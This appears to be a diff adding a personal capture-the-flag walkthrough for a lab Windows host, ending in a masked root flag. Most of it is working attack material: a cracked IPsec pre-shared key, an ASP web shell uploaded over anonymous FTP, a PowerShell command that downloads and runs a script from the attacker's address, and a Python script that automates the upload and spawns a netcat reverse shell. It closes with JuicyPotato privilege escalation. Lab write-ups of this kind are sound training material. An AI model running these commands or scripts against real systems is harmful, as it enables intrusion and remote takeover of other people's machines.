@@ -1,0 +1,103 @@
+snmp-check `cat ipaddress`
+
+# cracked with hashes.org
+Contact: IKE VPN password PSK - 9c8b1a372b1878851be2c097031b6e43:Dudecake1!
+
+# cat /etc/ipsec.conf
+conn home
+        authby=secret
+        auto=route
+        ike=3des-sha1-modp1024
+        left=10.10.13.61
+        right=10.10.10.116
+        keyexchange=ikev1
+        type=transport
+        esp=3des-sha1
+        rightprotoport=tcp
+
+# cat /etc/ipsec.secrets
+10.10.10.116 : PSK "Dudecake1!"
+
+Then run
+# ipsec restart
+
+low-priv > cp ~/tools/SecLists/Web-Shells/laudanum-0.8/asp/shell.asp .
+
+## Manual ##
+ftp 10.10.10.116 anonymous:anonymous
+put shell.asp
+
+10.10.10.116/upload/shell.asp
+in form:
+C:\Windows\system32\cmd /c powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.61/tcp.ps1')
+## Manual ##
+
+or
+
+### AUTOMATED low priv ###
+
+# cat low-priv/getShell.py
+from ftplib import FTP
+import requests
+import os
+
+def get_data(shell_ip):
+    data = {
+        'cmd': "c:\\windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -c iex(New-Object Net.WebClient).downloadString('http://%s/tcp.ps1')" % shell_ip,
+        'Content-Type': "application/x-www-form-urlencoded",
+        'submit': "Submit"
+        }
+    return data
+
+def upload_to_ftp(ip, file_to_upload):
+    ftp = FTP(ip)
+    ftp.login()
+    # upload shell
+    shell = open(file_to_upload, 'rb')
+    ftp.storbinary("STOR %s" % file_to_upload, shell)
+    shell.close()
+    ftp.quit()
+    print("[*] %s uploaded" % file_to_upload)
+
+def get_shell(target, shell_ip):
+    print("[*] Testing if localserver is running on port 80 and tcp.ps1 is present")
+    try:
+        test = requests.get("http://127.0.0.1/tcp.ps1")
+        if test.status_code != 200:
+            print("[X] tcp.ps1 not present")
+            exit(1)
+        data = {
+            'cmd': "c:\\windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -c iex(New-Object Net.WebClient).downloadString('http://%s/tcp.ps1')" % shell_ip,
+            'Content-Type': "application/x-www-form-urlencoded",
+            'submit': "Submit"
+            }
+    except:
+        print("[X] Webserver not running\n[*] Uploading nc.exe")
+        upload_to_ftp(target, "nc.exe")
+        data = {
+            'cmd': "c:\\inetpub\\wwwroot\\upload\\nc.exe %s 8000 -e c:\\windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe" % shell_ip,
+            'Content-Type': "application/x-www-form-urlencoded",
+            'submit': "Submit"
+            }
+    print("[*] Spawning reverse shell on port 8000")
+    requests.post("http://%s/upload/shell.asp" % target, data=data)
+    print("done")
+
+if __name__ == '__main__':
+    target = '10.10.10.116'
+    shell_ip = os.popen('tun0ip').read().strip()
+    upload_to_ftp(target, "shell.asp")
+    get_shell(target, shell_ip)
+
+### AUTOMATED low priv ###
+
+# nc -lvnp 8000
+# python3 getShell.py
+
+PRIV ESC: 
+setup nc -lvnp 8001
+# msfvenom reverse shell named shell8001.exe
+juicypotato.exe -p shell8001.exe -t * -l 9001 -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}
+
+root.txt
+573**************************E08
